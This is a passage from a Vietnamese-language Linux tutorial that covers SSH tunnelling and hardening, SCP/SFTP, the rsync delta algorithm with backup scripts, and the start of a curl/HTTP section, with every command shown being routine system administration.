</span></span><span class=line><span class=cl>ssh -L 3306:db:3306 -L 6379:redis:6379 user@server
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Background tunnel</span>
</span></span><span class=line><span class=cl>ssh -fNL 3306:localhost:3306 user@server
</span></span><span class=line><span class=cl><span class=c1># -f: Background sau authentication</span>
</span></span><span class=line><span class=cl><span class=c1># -N: Không chạy command</span>
</span></span><span class=line><span class=cl><span class=c1># -L: Local forward</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Keep tunnel alive</span>
</span></span><span class=line><span class=cl>ssh -o <span class=nv>ServerAliveInterval</span><span class=o>=</span><span class=m>60</span> -o <span class=nv>ServerAliveCountMax</span><span class=o>=</span><span class=m>3</span> ...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ProxyJump (SSH qua bastion)</span>
</span></span><span class=line><span class=cl>ssh -J bastion@bastion.com target@target.internal
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Trong config:</span>
</span></span><span class=line><span class=cl>Host target
</span></span><span class=line><span class=cl>    ProxyJump bastion</span></span></code></pre></div><h3 class=heading-element id=45-scp-và-sftp><span>4.5 SCP và SFTP</span>
<a href=#45-scp-v%c3%a0-sftp class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># SCP (Secure Copy) - Simple file transfer</span>
</span></span><span class=line><span class=cl>scp file.txt user@server:/path/
</span></span><span class=line><span class=cl>scp user@server:/path/file.txt ./
</span></span><span class=line><span class=cl>scp -r directory/ user@server:/path/    <span class=c1># Recursive</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># SFTP (SSH File Transfer Protocol) - Interactive</span>
</span></span><span class=line><span class=cl>sftp user@server
</span></span><span class=line><span class=cl>sftp&gt; put localfile.txt
</span></span><span class=line><span class=cl>sftp&gt; get remotefile.txt
</span></span><span class=line><span class=cl>sftp&gt; ls
</span></span><span class=line><span class=cl>sftp&gt; <span class=nb>cd</span> /path
</span></span><span class=line><span class=cl>sftp&gt; lcd /local/path
</span></span><span class=line><span class=cl>sftp&gt; quit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># SFTP trong script</span>
</span></span><span class=line><span class=cl>sftp user@server <span class=s>&lt;&lt; &#39;EOF&#39;
</span></span></span><span class=line><span class=cl><span class=s>put file.txt
</span></span></span><span class=line><span class=cl><span class=s>get data.csv
</span></span></span><span class=line><span class=cl><span class=s>EOF</span></span></span></code></pre></div><h3 class=heading-element id=46-security-best-practices><span>4.6 Security Best Practices</span>
<a href=#46-security-best-practices class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># /etc/ssh/sshd_config</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Disable password auth (key only)</span>
</span></span><span class=line><span class=cl>PasswordAuthentication no
</span></span><span class=line><span class=cl>ChallengeResponseAuthentication no
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Disable root login</span>
</span></span><span class=line><span class=cl>PermitRootLogin no
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Limit users</span>
</span></span><span class=line><span class=cl>AllowUsers admin deploy
</span></span><span class=line><span class=cl>AllowGroups sshusers
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Change port (security through obscurity, minimal benefit)</span>
</span></span><span class=line><span class=cl>Port <span class=m>2222</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Use only protocol 2</span>
</span></span><span class=line><span class=cl>Protocol <span class=m>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Limit authentication attempts</span>
</span></span><span class=line><span class=cl>MaxAuthTries <span class=m>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Timeout</span>
</span></span><span class=line><span class=cl>ClientAliveInterval <span class=m>300</span>
</span></span><span class=line><span class=cl>ClientAliveCountMax <span class=m>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Disable agent/X11 forwarding if not needed</span>
</span></span><span class=line><span class=cl>AllowAgentForwarding no
</span></span><span class=line><span class=cl>X11Forwarding no
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Restart sshd</span>
</span></span><span class=line><span class=cl>systemctl restart sshd</span></span></code></pre></div><hr><h2 class=heading-element id=phần-5-rsync---remote-sync><span>PHẦN 5: RSYNC - REMOTE SYNC</span>
<a href=#ph%e1%ba%a7n-5-rsync---remote-sync class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=51-delta-algorithm><span>5.1 Delta Algorithm</span>
<a href=#51-delta-algorithm class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│             RSYNC DELTA TRANSFER ALGORITHM                  │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Problem: Sync file lớn khi chỉ thay đổi một phần nhỏ
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Solution: Chỉ transfer những BLOCK đã thay đổi
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌───────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                   Rsync Algorithm                         │
</span></span><span class=line><span class=cl>├───────────────────────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│   1. Receiver chia file cũ thành blocks cố định           │
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│     File cũ:                                              │
</span></span><span class=line><span class=cl>│      ┌─────┬─────┬─────┬─────┬─────┐                      │
</span></span><span class=line><span class=cl>│      │ B1  │ B2  │ B3  │ B4  │ B5  │                      │
</span></span><span class=line><span class=cl>│      └─────┴─────┴─────┴─────┴─────┘                      │
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│   2. Receiver tính 2 checksums cho mỗi block:             │
</span></span><span class=line><span class=cl>│      - Rolling checksum (weak, fast): Adler-32            │
</span></span><span class=line><span class=cl>│      - Strong checksum: MD5 hoặc xxHash                   │
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│      ┌────────┬──────────────┬──────────────────┐         │
</span></span><span class=line><span class=cl>│      │ Block  │ Rolling (32b)│ Strong (128b)    │         │
</span></span><span class=line><span class=cl>│      ├────────┼──────────────┼──────────────────┤         │
</span></span><span class=line><span class=cl>│      │ B1     │ 0x12345678   │ a1b2c3d4e5f6...  │         │
</span></span><span class=line><span class=cl>│      │ B2     │ 0x87654321   │ f6e5d4c3b2a1...  │         │
</span></span><span class=line><span class=cl>│      │ ...    │ ...          │ ...              │         │
</span></span><span class=line><span class=cl>│      └────────┴──────────────┴──────────────────┘         │
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│  3. Gửi checksums cho Sender                              │
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│  4. Sender scan file mới với rolling window:              │
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│      File mới (có thêm data ở giữa):                      │
</span></span><span class=line><span class=cl>│      ┌─────┬──┬─────┬─────┬─────┬─────┐                   │
</span></span><span class=line><span class=cl>│      │ B1  │XX│ B2  │ B3  │ B4  │ B5  │                   │
</span></span><span class=line><span class=cl>│      └─────┴──┴─────┴─────┴─────┴─────┘                   │
</span></span><span class=line><span class=cl>│              ↑                                            │
</span></span><span class=line><span class=cl>│              New data                                     │
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│      Rolling checksum cho phép shift window O(1):         │
</span></span><span class=line><span class=cl>│ checksum(B[i+1..j+1]) = f(checksum(B[i..j]), B[i], B[j+1])|
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│  5. Khi rolling checksum match:                           │
</span></span><span class=line><span class=cl>│     → Verify với strong checksum                          │
</span></span><span class=line><span class=cl>│     → Nếu match: Block không đổi, skip                    │
</span></span><span class=line><span class=cl>│     → Nếu không match: Collision, tiếp tục scan           │
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│  6. Sender gửi:                                           │
</span></span><span class=line><span class=cl>│     - Literal data (phần mới/thay đổi)                    │
</span></span><span class=line><span class=cl>│     - Block references (phần không đổi)                   │
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>│  7. Receiver reconstruct file từ literal + references     │
</span></span><span class=line><span class=cl>│                                                           │
</span></span><span class=line><span class=cl>└───────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Complexity:
</span></span><span class=line><span class=cl><span class=k>-</span> Sender scan: O(n) với n = file size
</span></span><span class=line><span class=cl><span class=k>-</span> Checksum lookup: O(1) với hash table
</span></span><span class=line><span class=cl><span class=k>-</span> Total: O(n) time, O(b) space với b = number of blocks
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hiệu quả:
</span></span><span class=line><span class=cl><span class=k>-</span> File 1GB thay đổi 1KB → Transfer ~1KB + metadata
</span></span><span class=line><span class=cl>- Không cần full file comparison</span></span></code></pre></div><h3 class=heading-element id=52-cú-pháp-cơ-bản><span>5.2 Cú Pháp Cơ Bản</span>
<a href=#52-c%c3%ba-ph%c3%a1p-c%c6%a1-b%e1%ba%a3n class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>rsync <span class=o>[</span>OPTIONS<span class=o>]</span> SOURCE DEST
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Local sync</span>
</span></span><span class=line><span class=cl>rsync -av /source/ /dest/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Remote sync (qua SSH)</span>
</span></span><span class=line><span class=cl>rsync -av /source/ user@server:/dest/
</span></span><span class=line><span class=cl>rsync -av user@server:/source/ /dest/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Trailing slash QUAN TRỌNG:</span>
</span></span><span class=line><span class=cl>rsync -av /source  /dest/    <span class=c1># Tạo /dest/source/</span>
</span></span><span class=line><span class=cl>rsync -av /source/ /dest/    <span class=c1># Copy contents vào /dest/</span></span></span></code></pre></div><h3 class=heading-element id=53-options-quan-trọng><span>5.3 Options Quan Trọng</span>
<a href=#53-options-quan-tr%e1%bb%8dng class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Archive mode (phổ biến nhất)</span>
</span></span><span class=line><span class=cl>-a, --archive       <span class=c1># = -rlptgoD</span>
</span></span><span class=line><span class=cl>                    <span class=c1># -r: recursive</span>
</span></span><span class=line><span class=cl>                    <span class=c1># -l: preserve symlinks</span>
</span></span><span class=line><span class=cl>                    <span class=c1># -p: preserve permissions</span>
</span></span><span class=line><span class=cl>                    <span class=c1># -t: preserve timestamps</span>
</span></span><span class=line><span class=cl>                    <span class=c1># -g: preserve group</span>
</span></span><span class=line><span class=cl>                    <span class=c1># -o: preserve owner</span>
</span></span><span class=line><span class=cl>                    <span class=c1># -D: preserve devices &amp; specials</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Common options</span>
</span></span><span class=line><span class=cl>-v, --verbose       <span class=c1># Hiện progress</span>
</span></span><span class=line><span class=cl>-z, --compress      <span class=c1># Compress trong transfer</span>
</span></span><span class=line><span class=cl>-P                  <span class=c1># = --partial --progress</span>
</span></span><span class=line><span class=cl>--progress          <span class=c1># Hiện progress bar</span>
</span></span><span class=line><span class=cl>--partial           <span class=c1># Giữ partial files (resume được)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Delete options</span>
</span></span><span class=line><span class=cl>--delete            <span class=c1># Xóa file ở dest không có ở source</span>
</span></span><span class=line><span class=cl>--delete-before     <span class=c1># Xóa trước khi transfer</span>
</span></span><span class=line><span class=cl>--delete-after      <span class=c1># Xóa sau khi transfer</span>
</span></span><span class=line><span class=cl>--delete-excluded   <span class=c1># Xóa cả excluded files</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Exclude/Include</span>
</span></span><span class=line><span class=cl>--exclude<span class=o>=</span><span class=s1>&#39;*.log&#39;</span>
</span></span><span class=line><span class=cl>--exclude-from<span class=o>=</span>exclude.txt
</span></span><span class=line><span class=cl>--include<span class=o>=</span><span class=s1>&#39;*.conf&#39;</span>
</span></span><span class=line><span class=cl>--include-from<span class=o>=</span>include.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Checksum (thay vì time+size)</span>
</span></span><span class=line><span class=cl>-c, --checksum      <span class=c1># So sánh bằng checksum (chậm hơn)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Dry run</span>
</span></span><span class=line><span class=cl>-n, --dry-run       <span class=c1># Chỉ hiện, không làm thật</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Bandwidth limit</span>
</span></span><span class=line><span class=cl>--bwlimit<span class=o>=</span><span class=m>1000</span>      <span class=c1># Giới hạn 1000 KB/s</span></span></span></code></pre></div><h3 class=heading-element id=54-ví-dụ-thực-tế><span>5.4 Ví Dụ Thực Tế</span>
<a href=#54-v%c3%ad-d%e1%bb%a5-th%e1%bb%b1c-t%e1%ba%bf class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Backup với progress</span>
</span></span><span class=line><span class=cl>rsync -avP /home/user/ /backup/user/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Backup qua SSH với compression</span>
</span></span><span class=line><span class=cl>rsync -avz -e ssh /data/ user@backup-server:/backup/data/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Incremental backup (giữ nhiều versions)</span>
</span></span><span class=line><span class=cl>rsync -av --link-dest<span class=o>=</span>/backup/yesterday /source/ /backup/today/
</span></span><span class=line><span class=cl><span class=c1># File không đổi → hard link đến yesterday (tiết kiệm space)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Mirror (sync chính xác, xóa extra files)</span>
</span></span><span class=line><span class=cl>rsync -av --delete /source/ /dest/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Exclude patterns</span>
</span></span><span class=line><span class=cl>rsync -av <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    --exclude<span class=o>=</span><span class=s1>&#39;*.log&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    --exclude<span class=o>=</span><span class=s1>&#39;*.tmp&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    --exclude<span class=o>=</span><span class=s1>&#39;.git/&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    --exclude<span class=o>=</span><span class=s1>&#39;node_modules/&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    /project/ /backup/project/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Resume interrupted transfer</span>
</span></span><span class=line><span class=cl>rsync -avP --partial /large/file user@server:/dest/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Limit bandwidth (không chiếm hết network)</span>
</span></span><span class=line><span class=cl>rsync -avz --bwlimit<span class=o>=</span><span class=m>5000</span> /data/ user@server:/backup/
</span></span><span class=line><span class=cl><span class=c1># 5000 KB/s = 5 MB/s</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Dry run (test trước)</span>
</span></span><span class=line><span class=cl>rsync -avn --delete /source/ /dest/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Different SSH port</span>
</span></span><span class=line><span class=cl>rsync -av -e <span class=s1>&#39;ssh -p 2222&#39;</span> /source/ user@server:/dest/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Sync specific file types only</span>
</span></span><span class=line><span class=cl>rsync -av --include<span class=o>=</span><span class=s1>&#39;*/&#39;</span> --include<span class=o>=</span><span class=s1>&#39;*.py&#39;</span> --exclude<span class=o>=</span><span class=s1>&#39;*&#39;</span> /src/ /dest/
</span></span><span class=line><span class=cl><span class=c1># --include=&#39;*/&#39;: Include directories (để traverse)</span>
</span></span><span class=line><span class=cl><span class=c1># --include=&#39;*.py&#39;: Include .py files</span>
</span></span><span class=line><span class=cl><span class=c1># --exclude=&#39;*&#39;: Exclude everything else</span></span></span></code></pre></div><h3 class=heading-element id=55-backup-strategy-với-rsync><span>5.5 Backup Strategy với Rsync</span>
<a href=#55-backup-strategy-v%e1%bb%9bi-rsync class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1># Rotating backup với rsync và hard links</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>BACKUP_DIR</span><span class=o>=</span><span class=s2>&#34;/backup&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>SOURCE</span><span class=o>=</span><span class=s2>&#34;/data&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>DATE</span><span class=o>=</span><span class=k>$(</span>date +%Y%m%d<span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Rotate old backups</span>
</span></span><span class=line><span class=cl>rm -rf <span class=nv>$BACKUP_DIR</span>/daily.7
</span></span><span class=line><span class=cl><span class=k>for</span> i in <span class=m>6</span> <span class=m>5</span> <span class=m>4</span> <span class=m>3</span> <span class=m>2</span> 1<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> -d <span class=nv>$BACKUP_DIR</span>/daily.<span class=nv>$i</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        mv <span class=nv>$BACKUP_DIR</span>/daily.<span class=nv>$i</span> <span class=nv>$BACKUP_DIR</span>/daily.<span class=k>$((</span>i+1<span class=k>))</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Copy daily.0 to daily.1 (hard links)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -d <span class=nv>$BACKUP_DIR</span>/daily.0 <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    cp -al <span class=nv>$BACKUP_DIR</span>/daily.0 <span class=nv>$BACKUP_DIR</span>/daily.1
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Rsync new backup</span>
</span></span><span class=line><span class=cl>rsync -av --delete <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    --exclude<span class=o>=</span><span class=s1>&#39;*.tmp&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    --exclude<span class=o>=</span><span class=s1>&#39;*.log&#39;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=nv>$SOURCE</span>/ <span class=nv>$BACKUP_DIR</span>/daily.0/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Result:</span>
</span></span><span class=line><span class=cl><span class=c1># daily.0 = latest (new/changed files)</span>
</span></span><span class=line><span class=cl><span class=c1># daily.1-7 = older versions (hard links to unchanged files)</span>
</span></span><span class=line><span class=cl><span class=c1># Disk usage ≈ 1 full + changes only</span></span></span></code></pre></div><hr><h2 class=heading-element id=phần-6-curl--wget><span>PHẦN 6: CURL & WGET</span>
<a href=#ph%e1%ba%a7n-6-curl--wget class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=61-curl---http-swiss-army-knife><span>6.1 Curl - HTTP Swiss Army Knife</span>
<a href=#61-curl---http-swiss-army-knife class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                    HTTP PROTOCOL FLOW                       │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Client                                              Server
</span></span><span class=line><span class=cl>   │                                                   │
</span></span><span class=line><span class=cl>   │  ────────── TCP 3-way handshake ──────────────►   │
</span></span><span class=line><span class=cl>   │                                                   │
</span></span><span class=line><span class=cl>   │  GET /path HTTP/1.1                               │
</span></span><span class=line><span class=cl>   │  Host: example.com                                │
</span></span><span class=line><span class=cl>   │  User-Agent: curl/7.68.0                          │
</span></span><span class=line><span class=cl>   │  Accept: <span class=ge>*/*</span>                                      │
</span></span><span class=line><span class=cl>   │  ───────────────────────────────────────────────► │
